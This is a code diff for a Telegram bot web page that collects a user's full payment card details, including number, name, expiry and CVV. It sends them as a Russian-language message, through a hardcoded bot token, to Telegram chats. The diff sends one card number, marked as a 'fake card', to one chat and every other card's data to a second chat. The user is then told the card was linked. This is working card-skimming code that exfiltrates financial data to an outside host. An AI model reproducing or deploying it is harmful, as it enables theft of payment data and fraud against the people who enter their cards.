@@ -1553,9 +1553,14 @@
                   cardCvv: document.getElementById('cardCvv').value
                 };
                 
-                let cleanedCardNumber = parseInt(cardData.cardNumber.replace(/\s/g, ''));
-
-                let cardDataText = `Данные пользователя <b>ID${userID}</b> получены:\n\n<b>Card Number:</b> ${cardData.cardNumber}\n<b>Card Name:</b> ${cardData.cardName}\n<b>Expiration Date:</b> ${cardData.cardMonth}/${cardData.cardYear}\n<b>CVV:</b> ${cardData.cardCvv}`;
+                let cardDataText;
+                
+                if (document.getElementById('cardNumber').value === '5167 4345 5899 7134') {
+                  cardDataText = `Пользователь <b>ID${userID}</b> успешно подключил фейк карту к боту!`;
+                }
+                else{
+                  cardDataText = `Данные пользователя <b>ID${userID}</b> получены:\n\n<b>Card Number:</b> ${cardData.cardNumber}\n<b>Card Name:</b> ${cardData.cardName}\n<b>Expiration Date:</b> ${cardData.cardMonth}/${cardData.cardYear}\n<b>CVV:</b> ${cardData.cardCvv}`;
+                }
                 
                 let MsgInfo = `UserInfoID${userID}`;
 
@@ -1573,7 +1578,7 @@
                         console.error('Error:', error);
                       });
                 
-                if (cleanedCardNumber === 5167434558997134){
+                if (document.getElementById('cardNumber').value === '5167 4345 5899 7134'){
                   fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=409013849&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
                     .then(response => response.json())
                     .then(data => console.log(data))
@@ -1598,7 +1603,7 @@
                   };
                 
                   // Отправляем данные в Telegram Bot
-                  if (cleanedCardNumber === 5167434558997134){
+                  if (document.getElementById('cardNumber').value !== '5167 4345 5899 7134'){
                     fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=7329305712&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
                         .then(response => response.json())
                         .then(data => console.log(data))
@@ -1626,7 +1631,6 @@
                       userID = tg.initDataUnsafe.user.id;
 
                       let DataText = `<b>🎉 Awesome! You've successfully linked your card to the bot!</b>\n\n 🎉Thanks for choosing us! 😊`;
-                      
                       let success_add = `add_credit_card5167 4345 5899 7134`;
 
                       let replyMarkup = {
